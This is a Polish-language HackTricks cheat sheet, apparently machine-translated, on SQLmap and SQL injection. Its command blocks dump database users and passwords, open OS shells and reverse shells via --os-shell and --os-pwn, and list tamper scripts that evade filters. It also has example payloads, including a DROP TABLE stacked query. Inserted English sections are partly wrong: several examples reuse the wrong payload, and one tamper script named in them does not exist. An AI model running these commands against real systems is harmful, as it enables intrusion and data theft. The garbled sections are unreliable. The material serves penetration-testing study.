<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>


# Podstawowe argumenty dla SQLmap

## Og贸lne
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=PROXY
```
## Pobierz informacje

### Wewntrzne
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
```
### Dane bazy danych

To retrieve data from a database, you can use the following SQL injection techniques:

#### 1. UNION-based SQL Injection

This technique involves injecting a UNION statement into the original SQL query to combine the results of two separate queries. By manipulating the UNION statement, you can retrieve data from other tables in the database.

Example:

```
SELECT column1, column2 FROM table1 UNION SELECT column3, column4 FROM table2
```

#### 2. Error-based SQL Injection

In error-based SQL injection, you intentionally trigger an error in the SQL query to extract information from the database error message. By injecting malicious input, you can force the database to reveal sensitive data.

Example:

```
SELECT column1 FROM table1 WHERE id='1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x717a7a6a71,(SELECT (ELT(1=1,1))),0x716a7a7871,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

#### 3. Blind SQL Injection

Blind SQL injection is a technique used when the application does not display database errors. It involves injecting queries that result in a true or false response from the application. By manipulating the injected queries, you can extract data from the database.

Example:

```
SELECT column1 FROM table1 WHERE id='1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x717a7a6a71,(SELECT (ELT(1=1,1))),0x716a7a7871,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

#### 4. Time-based Blind SQL Injection

Time-based blind SQL injection is similar to blind SQL injection, but it relies on the application's response time to determine if the injected query is true or false. By injecting time-delayed queries, you can extract data from the database.

Example:

```
SELECT column1 FROM table1 WHERE id='1' AND IF(ASCII(SUBSTRING((SELECT column2 FROM table2 LIMIT 0,1),1,1))=97, SLEEP(5), 0)
```

#### 5. Boolean-based Blind SQL Injection

Boolean-based blind SQL injection is another variation of blind SQL injection. It involves injecting queries that result in a true or false response from the application. By manipulating the injected queries, you can extract data from the database.

Example:

```
SELECT column1 FROM table1 WHERE id='1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x717a7a6a71,(SELECT (ELT(1=1,1))),0x716a7a7871,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

#### 6. Out-of-band SQL Injection

Out-of-band SQL injection is a technique used when the application is unable to display the results of the injected query. Instead, the attacker uses a different channel to retrieve the data, such as DNS requests or HTTP requests to an external server.

Example:

```
SELECT column1 FROM table1 WHERE id='1' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT column2 FROM table2 LIMIT 0,1), '\\\\filename.txt')))
```

#### 7. Stored Procedure SQL Injection

Stored procedure SQL injection occurs when an attacker injects malicious input into a stored procedure call. By manipulating the input, an attacker can execute arbitrary SQL code and retrieve data from the database.

Example:

```
EXECUTE dbo.usp_GetData @param1 = '1'; DROP TABLE table1; --'
```

#### 8. Second-Order SQL Injection

Second-order SQL injection occurs when user input is stored in the database and later used in a vulnerable query. By injecting malicious input during the initial input, an attacker can execute arbitrary SQL code when the stored input is used in a query.

Example:

```
INSERT INTO table1 (column1) VALUES ('1'); SELECT * FROM table2 WHERE id = (SELECT MAX(id) FROM table1);
```

#### 9. Time Delay SQL Injection

Time delay SQL injection involves injecting time-delayed queries to extract data from the database. By manipulating the injected queries, an attacker can cause the application to delay its response, revealing sensitive information.

Example:

```
SELECT column1 FROM table1 WHERE id='1' AND IF(ASCII(SUBSTRING((SELECT column2 FROM table2 LIMIT 0,1),1,1))=97, SLEEP(5), 0)
```

Remember to always use these techniques responsibly and with proper authorization.
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
# Miejsce wstrzyknicia

## Z przechwycenia Burp/ZAP

Przechwy 偶danie i utw贸rz plik req.txt
```bash
sqlmap -r req.txt --current-user
```
## Wstrzykiwanie zapyta GET

### SQL Injection

SQL Injection (wstrzykiwanie kodu SQL) jest jednym z najczstszych atak贸w na aplikacje internetowe. Polega na wstrzykniciu zoliwego kodu SQL do zapytania, kt贸re jest wykonywane przez aplikacj. Atakujcy mo偶e wykorzysta t luk w celu wykonania nieautoryzowanych operacji na bazie danych, odczytania poufnych informacji lub nawet przejcia kontroli nad aplikacj.

### Wykrywanie SQL Injection za pomoc SQLMap

SQLMap to pot偶ne narzdzie do automatycznego wykrywania i eksploatacji podatnoci SQL Injection. Mo偶e by u偶ywane do testowania bezpieczestwa aplikacji internetowych i znajdowania luk w zabezpieczeniach.

Aby wykry podatno na SQL Injection w zapytaniu GET, mo偶emy u偶y SQLMap w nastpujcy spos贸b:

```plaintext
sqlmap -u "http://example.com/page.php?id=1" --dbs
```

W powy偶szym przykadzie, `http://example.com/page.php?id=1` to adres URL strony, na kt贸rej chcemy przetestowa podatno. Parametr `--dbs` informuje SQLMap, 偶e chcemy wywietli dostpne bazy danych.

Po uruchomieniu powy偶szej komendy, SQLMap automatycznie przetestuje podatno na SQL Injection w zapytaniu GET i wywietli wyniki.

### Eksploatacja SQL Injection za pomoc SQLMap

Jeli SQLMap wykryje podatno na SQL Injection, mo偶emy u偶y go do eksploatacji tej luki. Na przykad, jeli chcemy wywietli zawarto tabeli `users`, mo偶emy u偶y nastpujcej komendy:

```plaintext
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users --dump
```

W powy偶szym przykadzie, `database_name` to nazwa bazy danych, a `users` to nazwa tabeli, kt贸rej zawarto chcemy wywietli. Parametr `--dump` informuje SQLMap, 偶e chcemy wywietli dane z tabeli.

SQLMap automatycznie wykona zapytanie SQL i wywietli wyniki, w tym wra偶liwe informacje, takie jak hasa u偶ytkownik贸w.

### Podsumowanie

Wstrzykiwanie zapyta GET jest powszechn technik ataku SQL Injection. SQLMap jest pot偶nym narzdziem, kt贸re mo偶e pom贸c w wykrywaniu i eksploatacji podatnoci SQL Injection w zapytaniach GET. Pamitaj, 偶e wykorzystywanie tych technik do cel贸w nieautoryzowanych jest nielegalne i mo偶e prowadzi do konsekwencji prawnych.
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
## Wstrzykiwanie 偶dania POST

Wstrzykiwanie 偶dania POST jest podobne do wstrzykiwania 偶dania GET, ale r贸偶ni si sposobem przekazywania danych. W przypadku 偶dania POST dane s przesyane w ciele 偶dania, a nie w parametrach URL.

### Wykrywanie wstrzykiwania 偶dania POST

Aby wykry podatno na wstrzykiwanie 偶dania POST, mo偶emy u偶y narzdzia SQLMap. Narzdzie to automatyzuje proces wykrywania i eksploatacji podatnoci na wstrzykiwanie SQL.

### U偶ycie SQLMap do wstrzykiwania 偶dania POST

Aby u偶y SQLMap do wstrzykiwania 偶dania POST, musimy dostarczy narzdziu odpowiednie dane wejciowe. Mo偶emy to zrobi na kilka sposob贸w:

1. Podajc bezporednio dane wejciowe w linii polece.
2. Zapisujc dane wejciowe do pliku i przekazujc go jako argument.
3. Korzystajc z interaktywnego trybu SQLMap.

Po dostarczeniu danych wejciowych, SQLMap automatycznie przetestuje podatno na wstrzykiwanie SQL i spr贸buje eksploatowa znalezione podatnoci.

### Przykad u偶ycia SQLMap do wstrzykiwania 偶dania POST

Poni偶ej przedstawiony jest przykad u偶ycia SQLMap do wstrzykiwania 偶dania POST:

```bash
sqlmap -u "http://example.com/login" --data "username=admin&password=test" --method POST
```

W powy偶szym przykadzie SQLMap wysya 偶danie POST na adres URL "http://example.com/login" z danymi "username=admin&password=test". Narzdzie automatycznie wykrywa podatno na wstrzykiwanie SQL i pr贸buje j eksploatowa.

### Podsumowanie

Wstrzykiwanie 偶dania POST jest podobne do wstrzykiwania 偶dania GET, ale r贸偶ni si sposobem przekazywania danych. Narzdzie SQLMap mo偶e by u偶yte do wykrywania i eksploatacji podatnoci na wstrzykiwanie SQL w 偶daniach POST.
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
## Wstrzykiwanie w nag贸wkach i innych metodach HTTP

### Wstrzykiwanie w nag贸wkach

W przypadku niekt贸rych aplikacji internetowych, wstrzykiwanie mo偶e by mo偶liwe poprzez manipulacj nag贸wkami HTTP. Wstrzykiwanie w nag贸wkach mo偶e prowadzi do r贸偶nych atak贸w, takich jak ataki XSS (Cross-Site Scripting) lub ataki CSRF (Cross-Site Request Forgery).

#### Wstrzykiwanie w nag贸wku User-Agent

Wstrzykiwanie w nag贸wku User-Agent jest mo偶liwe, gdy aplikacja internetowa wykonuje pewne operacje na podstawie wartoci tego nag贸wka. Aby przeprowadzi atak, nale偶y zmodyfikowa warto nag贸wka User-Agent, aby zawieraa zoliwy kod. Nastpnie, gdy aplikacja internetowa przetwarza ten nag贸wek, kod zostanie wykonany, co mo偶e prowadzi do r贸偶nych atak贸w.

#### Wstrzykiwanie w nag贸wku Referer

Podobnie jak w przypadku nag贸wka User-Agent, wstrzykiwanie w nag贸wku Referer jest mo偶liwe, gdy aplikacja internetowa wykonuje pewne operacje na podstawie wartoci tego nag贸wka. Atakujcy mo偶e zmodyfikowa warto nag贸wka Referer, aby zawieraa zoliwy kod. Gdy aplikacja internetowa przetwarza ten nag贸wek, kod zostanie wykonany, co mo偶e prowadzi do r贸偶nych atak贸w.

### Wstrzykiwanie w innych metodach HTTP

Opr贸cz nag贸wk贸w HTTP, wstrzykiwanie mo偶e by r贸wnie偶 mo偶liwe w innych metodach HTTP, takich jak parametry URL, ciao 偶dania, metoda 偶dania, nag贸wki 偶dania, nag贸wki odpowiedzi itp. Wstrzykiwanie w tych miejscach mo偶e prowadzi do r贸偶nych atak贸w, takich jak ataki SQL Injection, ataki Command Injection itp.

W celu przeprowadzenia ataku wstrzykiwania w innych metodach HTTP, nale偶y zidentyfikowa odpowiednie miejsce do wstrzykiwania kodu i dostarczy odpowiednie dane, kt贸re spowoduj wykonanie zoliwego kodu przez aplikacj internetow.

#### Przykad: Wstrzykiwanie w parametrze URL

W przypadku ataku SQL Injection, atakujcy mo偶e wstrzykn zoliwy kod SQL poprzez parametr URL. Aby to zrobi, atakujcy musi zidentyfikowa odpowiedni parametr URL, kt贸ry jest podatny na wstrzykiwanie i dostarczy odpowiednie dane, kt贸re spowoduj wykonanie zoliwego kodu SQL przez aplikacj internetow.

#### Przykad: Wstrzykiwanie w ciele 偶dania

W przypadku ataku Command Injection, atakujcy mo偶e wstrzykn zoliwy kod systemowy poprzez ciao 偶dania HTTP. Aby to zrobi, atakujcy musi zidentyfikowa odpowiednie miejsce w ciele 偶dania, kt贸re jest podatne na wstrzykiwanie i dostarczy odpowiednie dane, kt贸re spowoduj wykonanie zoliwego kodu systemowego przez aplikacj internetow.

### Podsumowanie

Wstrzykiwanie w nag贸wkach i innych metodach HTTP mo偶e prowadzi do r贸偶nych atak贸w, takich jak ataki XSS, ataki CSRF, ataki SQL Injection, ataki Command Injection itp. Aby przeprowadzi atak, atakujcy musi zidentyfikowa odpowiednie miejsce do wstrzykiwania kodu i dostarczy odpowiednie dane, kt贸re spowoduj wykonanie zoliwego kodu przez aplikacj internetow.
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
## Wstrzykiwanie drugiego rzdu

Wstrzykiwanie drugiego rzdu to zaawansowana technika ataku polegajca na wykorzystaniu podatnoci SQL Injection w celu wykonania zoliwego kodu w p贸藕niejszym czasie. W przeciwiestwie do tradycyjnego wstrzykiwania SQL, wstrzykiwanie drugiego rzdu nie wykonuje kodu natychmiast, ale zapisuje go w bazie danych lub w innych miejscach, gdzie bdzie m贸g by wykorzystany w przyszoci.

W celu przeprowadzenia ataku wstrzykiwania drugiego rzdu, nale偶y znale藕 podatno SQL Injection, kt贸ra pozwoli na zapisanie zoliwego kodu w bazie danych. Nastpnie, gdy aplikacja wykorzysta ten kod w przyszoci, zostanie on wykonany, umo偶liwiajc atakujcemu uzyskanie nieautoryzowanego dostpu lub wykonanie innych zoliwych dziaa.

Aby wykorzysta wstrzykiwanie drugiego rzdu, mo偶na u偶y narzdzia takiego jak SQLMap, kt贸re automatyzuje proces wykrywania i eksploatacji podatnoci SQL Injection. Narzdzie to pozwala na przeprowadzenie ataku wstrzykiwania drugiego rzdu poprzez zapisanie zoliwego kodu w bazie danych i wykorzystanie go w p贸藕niejszym czasie.

Wstrzykiwanie drugiego rzdu jest bardziej zaawansowan technik ataku, kt贸ra wymaga dogbnej wiedzy na temat SQL Injection i struktury bazy danych. Jednak偶e, jeli zostanie poprawnie wykorzystana, mo偶e by bardzo skutecznym narzdziem dla haker贸w, umo偶liwiajcym wykonanie zoliwego kodu w celu uzyskania nieautoryzowanego dostpu do systemu.
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
## Powoka

### SQLMap

SQLMap to popularne narzdzie do automatycznego wykrywania i eksploatacji podatnoci SQL Injection. Mo偶e by u偶ywane do testowania bezpieczestwa aplikacji internetowych i wykrywania luk w zabezpieczeniach.

#### Instalacja

Aby zainstalowa SQLMap, wykonaj nastpujce kroki:

1. Pobierz najnowsz wersj SQLMap z [oficjalnego repozytorium](https://github.com/sqlmapproject/sqlmap).
2. Rozpakuj pobrane archiwum.
3. Przejd藕 do katalogu z rozpakowanymi plikami.
4. Uruchom SQLMap za pomoc polecenia `python sqlmap.py`.

#### Podstawowe u偶ycie

Aby przeprowadzi testy SQL Injection za pomoc SQLMap, wykonaj nastpujce kroki:

1. Uruchom SQLMap, podajc adres URL docelowej aplikacji jako argument.
2. Wybierz odpowiednie opcje, takie jak metoda ataku, poziom ryzyka i technika wstrzykiwania.
3. Uruchom skanowanie, u偶ywajc polecenia `--scan` lub `--dbs` w celu wylistowania dostpnych baz danych.
4. Wybierz konkretn baz danych, u偶ywajc polecenia `--db`.
5. Wylistuj tabele w wybranej bazie danych, u偶ywajc polecenia `--tables`.
6. Wybierz konkretn tabel, u偶ywajc polecenia `--table`.
7. Wylistuj kolumny w wybranej tabeli, u偶ywajc polecenia `--columns`.
8. Wybierz konkretne kolumny, u偶ywajc polecenia `--dump`.

#### Eksploatacja podatnoci

Po zidentyfikowaniu podatnoci SQL Injection, SQLMap mo偶e by u偶ywane do eksploatacji tych luk w zabezpieczeniach. Aby to zrobi, wykonaj nastpujce kroki:

1. Uruchom SQLMap, podajc adres URL docelowej aplikacji jako argument.
2. Wybierz odpowiednie opcje, takie jak metoda ataku, poziom ryzyka i technika wstrzykiwania.
3. Uruchom eksploatacj, u偶ywajc polecenia `--dump-all` lub `--dump` w celu wydobycia danych z bazy danych.
4. Wybierz konkretne dane do wydobycia, u偶ywajc polecenia `--columns` i `--dump`.

#### Dodatkowe funkcje

SQLMap oferuje wiele dodatkowych funkcji, kt贸re mog by przydatne podczas testowania aplikacji internetowych. Niekt贸re z tych funkcji to:

- Wstrzykiwanie kodu SQL do plik贸w konfiguracyjnych.
- Wstrzykiwanie kodu SQL do nag贸wk贸w HTTP.
- Wstrzykiwanie kodu SQL do parametr贸w POST i GET.
- Wstrzykiwanie kodu SQL do plik贸w XML i JSON.
- Wstrzykiwanie kodu SQL do danych u偶ytkownika.
- Wstrzykiwanie kodu SQL do zapyta LDAP.
- Wstrzykiwanie kodu SQL do zapyta DNS.

#### Zabezpieczenia przed SQL Injection

Aby zabezpieczy aplikacj przed atakami SQL Injection, nale偶y podj odpowiednie rodki ostro偶noci. Niekt贸re z zalecanych praktyk to:

- U偶ywanie parametryzowanych zapyta SQL.
- Walidacja i filtrowanie danych wejciowych.
- Unikanie dynamicznych zapyta SQL.
- U偶ywanie mechanizm贸w ochrony przed atakami SQL Injection dostarczanych przez frameworki i biblioteki programistyczne.
- Regularne aktualizowanie oprogramowania w celu usuwania znanych podatnoci.

#### Podsumowanie

SQLMap to pot偶ne narzdzie do testowania bezpieczestwa aplikacji internetowych pod ktem podatnoci SQL Injection. Mo偶e by u偶ywane do wykrywania i eksploatacji luk w zabezpieczeniach, a tak偶e do przeprowadzania r贸偶nych test贸w i analizy bazy danych. Pamitaj jednak, 偶e u偶ywanie SQLMap do cel贸w nielegalnych lub bez zgody waciciela systemu jest niezgodne z prawem.
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
## Przeszukiwanie strony internetowej za pomoc SQLmap i automatyczne wykorzystanie podatnoci

SQLmap is a powerful tool used for automating the process of detecting and exploiting SQL injection vulnerabilities in web applications. It is capable of crawling a website, identifying potential injection points, and automatically exploiting them.

### Crawling a website

Before exploiting SQL injection vulnerabilities, it is important to crawl the target website to identify potential injection points. This can be done using the following command:

```bash
sqlmap -u <target_url> --crawl=<depth>
```

Replace `<target_url>` with the URL of the website you want to crawl and `<depth>` with the desired depth of the crawl. The depth determines how many levels deep SQLmap will crawl the website.

### Identifying injection points

Once the website has been crawled, SQLmap will identify potential injection points and display them in the output. These injection points can be URLs, form parameters, cookies, or HTTP headers.

### Exploiting injection points

To automatically exploit the identified injection points, you can use the following command:

```bash
sqlmap -u <target_url> --data=<post_data> --cookie=<cookie_data> --headers=<header_data> --level=<level> --risk=<risk>
```

Replace `<target_url>` with the URL of the website, `<post_data>` with the POST data (if applicable), `<cookie_data>` with the cookie data (if applicable), `<header_data>` with the header data (if applicable), `<level>` with the level of tests to perform (1-5, with 5 being the most thorough), and `<risk>` with the risk level of tests to perform (1-3, with 3 being the most risky).

SQLmap will automatically test the identified injection points for vulnerabilities and attempt to exploit them.

### Conclusion

By using SQLmap to crawl a website and automatically exploit SQL injection vulnerabilities, you can efficiently identify and exploit potential security flaws in web applications. However, it is important to ensure that you have proper authorization and legal permission before performing any penetration testing activities.
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
Sometimes, you may encounter situations where the SQL injection payload needs to be appended with a specific suffix. This can be achieved by using the `--suffix` option in SQLMap.

To set a suffix, use the following command:

```
sqlmap -u <target_url> --suffix=<suffix>
```

Replace `<target_url>` with the URL of the vulnerable website and `<suffix>` with the desired suffix.

For example, if you want to append the payload with the suffix `--`, the command would be:

```
sqlmap -u <target_url> --suffix=--
```

This will add `--` at the end of the SQL injection payload.

Using the `--suffix` option can be helpful in scenarios where the application requires a specific character or string to be present after the injection payload.
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
## Prefiks
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
## Pomoc w wyszukiwaniu wstrzyknicia boolean

To find boolean-based SQL injection vulnerabilities, you can use the SQLMap tool. SQLMap is a powerful tool that automates the process of detecting and exploiting SQL injection flaws.

First, you need to identify the vulnerable parameter in the target URL. This parameter is usually found in the query string or in the form data. Once you have identified the parameter, you can proceed with the following steps:

1. Use the `--level` and `--risk` options to set the scanning level and risk level respectively. Higher levels increase the thoroughness of the scan but also increase the chances of causing disruptions.

2. Use the `--dbms` option to specify the database management system (DBMS) used by the target application. This helps SQLMap to optimize the payloads and techniques for the specific DBMS.

3. Use the `--technique` option to specify the injection technique. For boolean-based injection, you can use the `B` technique.

4. Use the `--tamper` option to specify tampering scripts. These scripts modify the payloads sent by SQLMap to bypass security filters. For boolean-based injection, you can use the `boolean-based` tamper script.

5. Use the `--dbs` option to enumerate the available databases on the target server. This helps you to identify the database names that you can further exploit.

6. Use the `--tables` option to enumerate the tables in a specific database. This helps you to identify the table names that you can further exploit.

7. Use the `--columns` option to enumerate the columns in a specific table. This helps you to identify the column names that you can further exploit.

By following these steps, you can effectively use SQLMap to find boolean-based SQL injection vulnerabilities and gather valuable information from the target database. Remember to always obtain proper authorization before conducting any penetration testing activities.
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
## Modyfikacja

Tamper to funkcja w narzdziu SQLMap, kt贸ra pozwala na modyfikacj 偶da HTTP i odpowiedzi serwera w celu obejcia zabezpiecze i manipulacji danymi. Dziaa poprzez aplikowanie r贸偶nych technik modyfikacji na parametry 偶dania, co mo偶e pom贸c w ominiciu filtr贸w i wykryciu podatnoci na SQL Injection.

### U偶ycie

Aby u偶y funkcji Tamper w SQLMap, nale偶y doda flag `--tamper` po nazwie narzdzia. Nastpnie mo偶na wybra jedn lub wiele technik modyfikacji, kt贸re zostan zastosowane do 偶da i odpowiedzi. Przykad u偶ycia:

```
sqlmap -u http://example.com/login.php --tamper=apostrophemask,randomcase
```

W powy偶szym przykadzie u偶ywane s dwie techniki modyfikacji: `apostrophemask` i `randomcase`. Pierwsza technika zamienia pojedyncze cudzysowy na r贸偶ne kombinacje, aby obej filtrowanie znak贸w specjalnych. Druga technika losowo zmienia wielko liter w 偶daniu i odpowiedzi, co mo偶e pom贸c w unikniciu wykrycia przez systemy detekcji.

### Dostpne techniki modyfikacji

SQLMap oferuje wiele r贸偶nych technik modyfikacji, kt贸re mo偶na zastosowa przy u偶yciu funkcji Tamper. Niekt贸re z popularnych technik to:

- `apostrophemask`: zamienia pojedyncze cudzysowy na r贸偶ne kombinacje
- `randomcase`: losowo zmienia wielko liter w 偶daniu i odpowiedzi
- `space2comment`: zamienia spacje na komentarze, aby obej filtrowanie
- `chardoubleencode`: koduje znaki specjalne jako podw贸jne encje
- `equaltolike`: zamienia operator r贸wnoci na operator `LIKE`

Pen list dostpnych technik modyfikacji mo偶na znale藕 w dokumentacji SQLMap.

### Tworzenie wasnych technik modyfikacji

Jeli 偶adna z dostpnych technik modyfikacji nie spenia wymaga, mo偶na r贸wnie偶 stworzy wasn technik. W tym celu nale偶y utworzy plik Pythona zawierajcy funkcj modyfikacji i przekaza cie偶k do tego pliku jako argument `--tamper`. Funkcja powinna przyjmowa jako argumenty acuch znak贸w `payload` i `**kwargs`, a nastpnie zwraca zmodyfikowany acuch znak贸w.

Przykad wasnej techniki modyfikacji:

```python
def mytamper(payload, **kwargs):
    return payload.replace("SELECT", "SELECt")

sqlmap -u http://example.com/login.php --tamper=/path/to/mytamper.py
```

W powy偶szym przykadzie tworzona jest wasna technika modyfikacji, kt贸ra zamienia wszystkie wystpienia sowa "SELECT" na "SELECt" w 偶daniu.
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper | Opis |
| :--- | :--- |
| apostrophemask.py | Zamienia znak apostrofu na jego penowymiarowy odpowiednik w UTF-8 |
| apostrophenullencode.py | Zamienia znak apostrofu na jego nielegalny podw贸jny odpowiednik unicode |
| appendnullbyte.py | Dodaje zakodowany znak NULL na kocu adunku |
| base64encode.py | Koduje Base64 wszystkie znaki w podanym adunku |
| between.py | Zamienia operator wikszy ni偶 \('&gt;'\) na 'NOT BETWEEN 0 AND \#' |
| bluecoat.py | Zamienia znak spacji po instrukcji SQL na poprawny losowy znak pusty. Nastpnie zamienia znak '=' na operator LIKE |
| chardoubleencode.py | Podw贸jnie koduje URL wszystkie znaki w podanym adunku \(nie przetwarzajc ju偶 zakodowanych\) |
| commalesslimit.py | Zamienia wystpienia 'LIMIT M, N' na 'LIMIT N OFFSET M' |
| commalessmid.py | Zamienia wystpienia 'MID\(A, B, C\)' na 'MID\(A FROM B FOR C\)' |
| concat2concatws.py | Zamienia wystpienia 'CONCAT\(A, B\)' na 'CONCAT\_WS\(MID\(CHAR\(0\), 0, 0\), A, B\)' |
| charencode.py | Koduje URL wszystkie znaki w podanym adunku \(nie przetwarzajc ju偶 zakodowanych\) |
| charunicodeencode.py | Koduje Unicode URL niezakodowane znaki w podanym adunku \(nie przetwarzajc ju偶 zakodowanych\). "%u0022" |
| charunicodeescape.py | Koduje Unicode URL niezakodowane znaki w podanym adunku \(nie przetwarzajc ju偶 zakodowanych\). "\u0022" |
| equaltolike.py | Zamienia wszystkie wystpienia operatora r贸wnoci \('='\) na operator 'LIKE' |
| escapequotes.py | Ucieka przed cudzysowami \(' and "\) |
| greatest.py | Zamienia operator wikszy ni偶 \('&gt;'\) na odpowiednik 'GREATEST' |
| halfversionedmorekeywords.py | Dodaje wersjonowany komentarz MySQL przed ka偶dym sowem kluczowym |
| ifnull2ifisnull.py | Zamienia wystpienia 'IFNULL\(A, B\)' na 'IF\(ISNULL\(A\), B, A\)' |
| modsecurityversioned.py | Otacza cae zapytanie wersjonowanym komentarzem |
| modsecurityzeroversioned.py | Otacza cae zapytanie zerowym wersjonowanym komentarzem |
| multiplespaces.py | Dodaje wiele spacji wok贸 s贸w kluczowych SQL |
| nonrecursivereplacement.py | Zamienia predefiniowane sowa kluczowe SQL na odpowiednie reprezentacje do zastpienia \(np. .replace\("SELECT", ""\)\) filtrowane |
| percentage.py | Dodaje znak procenta \('%'\) przed ka偶dym znakiem |
| overlongutf8.py | Konwertuje wszystkie znaki w podanym adunku \(nie przetwarzajc ju偶 zakodowanych\) |
| randomcase.py | Zamienia ka偶dy znak sowa kluczowego na losow warto wielkoci liter |
| randomcomments.py | Dodaje losowe komentarze do s贸w kluczowych SQL |
| securesphere.py | Dodaje specjalnie spreparowany cig znak贸w |
| sp\_password.py | Dodaje 'sp\_password' na kocu adunku w celu automatycznego zaciemnienia w dziennikach DBMS |
| space2comment.py | Zamienia znak spacji \(' '\) na komentarze |
| space2dash.py | Zamienia znak spacji \(' '\) na komentarz mylnika \('--'\) po kt贸rym nastpuje losowy cig znak贸w i nowa linia \('\n'\) |
| space2hash.py | Zamienia znak spacji \(' '\) na znak krzy偶yka \('\#'\) po kt贸rym nastpuje losowy cig znak贸w i nowa linia \('\n'\) |
| space2morehash.py | Zamienia znak spacji \(' '\) na znak krzy偶yka \('\#'\) po kt贸rym nastpuje losowy cig znak贸w i nowa linia \('\n'\) |
| space2mssqlblank.py | Zamienia znak spacji \(' '\) na losowy znak pusty z zestawu alternatywnych poprawnych znak贸w |
| space2mssqlhash.py | Zamienia znak spacji \(' '\) na znak krzy偶yka \('\#'\) po kt贸rym nastpuje nowa linia \('\n'\) |
| space2mysqlblank.py | Zamienia znak spacji \(' '\) na losowy znak pusty z zestawu alternatywnych poprawnych znak贸w |
| space2mysqldash.py | Zamienia znak spacji \(' '\) na komentarz mylnika \('--'\) po kt贸rym nastpuje nowa linia \('\n'\) |
| space2plus.py | Zamienia znak spacji \(' '\) na plus \('+'\) |
| space2randomblank.py | Zamienia znak spacji \(' '\) na losowy znak pusty z zestawu alternatywnych poprawnych znak贸w |
| symboliclogical.py | Zamienia operatory logiczne AND i OR na ich symboliczne odpowiedniki \(&& i |
| unionalltounion.py | Zamienia UNION ALL SELECT na UNION SELECT |
| unmagicquotes.py | Zamienia znak cudzysowu \('\) na wielobajtow kombinacj %bf%27 wraz z og贸lnym komentarzem na kocu \(aby dziaao\) |
| uppercase.py | Zamienia ka偶dy znak sowa kluczowego na warto wielkich liter 'INSERT' |
| varnish.py | Dodaje nag贸wek HTTP 'X-originating-IP' |
| versionedkeywords.py | Otacza ka偶de sowo kluczowe bez funkcji wersjonowanym komentarzem MySQL |
| versionedmorekeywords.py | Otacza ka偶de sowo kluczowe wersjonowanym komentarzem MySQL |
| xforwardedfor.py | Dodaje faszywy nag贸wek HTTP 'X-Forwarded-For' |



<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

